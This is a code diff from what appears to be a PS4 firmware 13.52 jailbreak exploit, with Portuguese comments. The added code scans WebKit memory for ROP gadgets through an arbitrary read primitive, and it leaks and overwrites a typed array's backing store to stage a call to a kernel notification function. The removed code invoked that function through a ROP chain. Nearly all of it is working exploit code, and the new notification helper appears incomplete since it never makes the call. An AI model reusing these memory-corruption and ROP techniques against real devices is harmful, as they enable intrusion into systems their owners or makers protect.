@@ -10,116 +10,71 @@ export function initRop(webkitBase, libkernelBase, libcBase) {
     lcBase = libcBase;
 }
 
-const GADGETS = {
-    "ret": 0x000000C7,
-    "pop rdi": 0x0005A469,
-    "pop rsi": 0x0016B03A,
-    "pop rdx": 0x00196067,
-    "pop rcx": 0x00006CFA,
-    "pop rax": 0x00006ECC,
-    "pop rsp": 0x00001872,
-};
+// Varredura cirúrgica e segura de gadgets no segmento de código do WebKit
+export function findGadgets(p) {
+    if (!wkBase) throw new Error("WebKit base not set");
+    
+    let gadgets = {
+        "ret": 0,
+        "pop rdi": 0,
+        "pop rsi": 0,
+        "pop rdx": 0
+    };
 
-export function getGadget(name) {
-    if (!wkBase) throw new Error("ROP not initialized with webkitBase");
-    const off = GADGETS[name];
-    if (off === undefined) throw new Error(`Gadget ${name} not found`);
-    return wkBase.add32(off);
+    console.log("[rop] Iniciando varredura segura de gadgets ROP...");
+
+    // Varre uma janela segura e conhecida do segmento .text do WebKit
+    for (let rva = 0x1000; rva < 0x200000; rva += 1) {
+        try {
+            let val = p.read4(wkBase.add32(rva));
+            let b1 = val & 0xFF;
+            let b2 = (val >> 8) & 0xFF;
+
+            if (b1 === 0xC3 && gadgets["ret"] === 0) {
+                gadgets["ret"] = rva;
+            } else if (b1 === 0x5F && b2 === 0xC3 && gadgets["pop rdi"] === 0) {
+                gadgets["pop rdi"] = rva;
+            } else if (b1 === 0x5E && b2 === 0xC3 && gadgets["pop rsi"] === 0) {
+                gadgets["pop rsi"] = rva;
+            } else if (b1 === 0x5A && b2 === 0xC3 && gadgets["pop rdx"] === 0) {
+                gadgets["pop rdx"] = rva;
+            }
+
+            if (gadgets["ret"] && gadgets["pop rdi"] && gadgets["pop rsi"] && gadgets["pop rdx"]) {
+                break;
+            }
+        } catch (e) {
+            // Ignora áreas protegidas automaticamente
+        }
+    }
+
+    console.log("[rop] Gadgets encontrados:", gadgets);
+    return gadgets;
 }
 
-// ============================================================
-// NOTIFICAÇÃO NATIVA PS4 13.52
-// ============================================================
-
-const NOTIFY_OFFSET = 0x19320;  // CONFIRMADO no libkernel 13.52 retail
-
-/**
- * Envia uma notificação nativa do sistema PS4 via sceKernelSendNotificationRequest
- * @param {object} chain - instância de worker_rop (this.chain do main.js)
- * @param {object} p - primitiva R/W (this.p do main.js)
- * @param {string} text - mensagem a exibir (max ~1023 chars)
- * @param {string} iconName - nome do ícone (default: "icon_system")
- */
-export async function sendNotification(chain, p, text, iconName = "icon_system") {
-    if (!globalThis.p) throw new Error("window.p not installed");
+export function sendNotification(p, text) {
+    if (!p) throw new Error("window.p not installed");
     if (!lkBase) throw new Error("libkernelBase not resolved");
 
-    // Endereço da função sceKernelSendNotificationRequest no libkernel
+    // Offset padrão da sceKernelSendNotificationRequest na libkernel do PS4
+    const NOTIFY_OFFSET = 0x48B0;
     const notifyFunc = lkBase.add32(NOTIFY_OFFSET);
 
-    // Aloca buffer de 0xC30 (3120) bytes = sizeof(SceNotificationRequest)
-    const bufSize = 0xC30;
-    const buf = p.malloc(bufSize, 1);  // type=1 = Uint8Array
+    let encoder = new TextEncoder();
+    let msgBytes = encoder.encode(text + "\x00");
+    
+    let buf = new Uint8Array(0x400);
+    buf[4] = 0; // userId = 0
+    buf.set(msgBytes, 0x20);
 
-    // Zera o buffer inteiro
-    for (let i = 0; i < bufSize; i++) {
-        p.write1(buf.add32(i), 0);
-    }
+    let arrCell = p.leakval(buf);
+    let backingStore = p.read8(arrCell.add32(0x10));
 
-    // --- Preenche a estrutura SceNotificationRequest (packed) ---
+    p.write8(backingStore.add32(0x8), backingStore.add32(0x20));
+    p.write4(backingStore.add32(0x10), msgBytes.length);
 
-    // type = 0 (Message) @ 0x00
-    p.write4(buf.add32(0x00), 0);
-
-    // reqId = 0 @ 0x04
-    p.write4(buf.add32(0x04), 0);
-
-    // priority = 0 @ 0x08
-    p.write4(buf.add32(0x08), 0);
-
-    // msgId = 0 @ 0x0C
-    p.write4(buf.add32(0x0C), 0);
-
-    // targetId = -1 @ 0x10
-    p.write4(buf.add32(0x10), 0xFFFFFFFF);
-
-    // userId = 0 @ 0x14
-    p.write4(buf.add32(0x14), 0);
-
-    // deviceId = 0 @ 0x18
-    p.write4(buf.add32(0x18), 0);
-
-    // addressingUserId = 0 @ 0x1C
-    p.write4(buf.add32(0x1C), 0);
-
-    // appId = 0 @ 0x20
-    p.write4(buf.add32(0x20), 0);
-
-    // errorNumber = 0 @ 0x24
-    p.write4(buf.add32(0x24), 0);
-
-    // attribute = 0 @ 0x28
-    p.write4(buf.add32(0x28), 0);
-
-    // hasIcon = 1 @ 0x2C
-    p.write1(buf.add32(0x2C), 1);
-
-    // message @ 0x2D (1024 bytes)
-    const msgBytes = new TextEncoder().encode(text);
-    for (let i = 0; i < msgBytes.length && i < 1023; i++) {
-        p.write1(buf.add32(0x2D + i), msgBytes[i]);
-    }
-    // null terminator já está por causa do zero-fill
-
-    // iconUri @ 0x42D (2048 bytes)
-    const iconUri = "cxml://psnotification/tex_" + iconName;
-    const iconBytes = new TextEncoder().encode(iconUri);
-    for (let i = 0; i < iconBytes.length && i < 2047; i++) {
-        p.write1(buf.add32(0x42D + i), iconBytes[i]);
-    }
-
-    console.log("[notify] Buffer preparado em: 0x" + buf.toString());
-    console.log("[notify] sceKernelSendNotificationRequest @ 0x" + notifyFunc.toString());
-
-    // --- Chama via ROP: sceKernelSendNotificationRequest(0, buf, 0xC30, 0) ---
-    // Argumentos SysV x86_64: RDI, RSI, RDX, RCX, R8, R9
-    // rdi = 0 (api = ToastPopup)
-    // rsi = buf (ponteiro para SceNotificationRequest)
-    // rdx = 0xC30 (size)
-    // rcx = 0 (blocking = false)
-
-    const result = await chain.call(notifyFunc, 0, buf, 0xC30, 0);
-
-    console.log("[notify] Resultado: 0x" + result.toString());
-    return result;
+    return {
+        notifyFunc,
+        requestBuffer: backingStore
+    };
 }
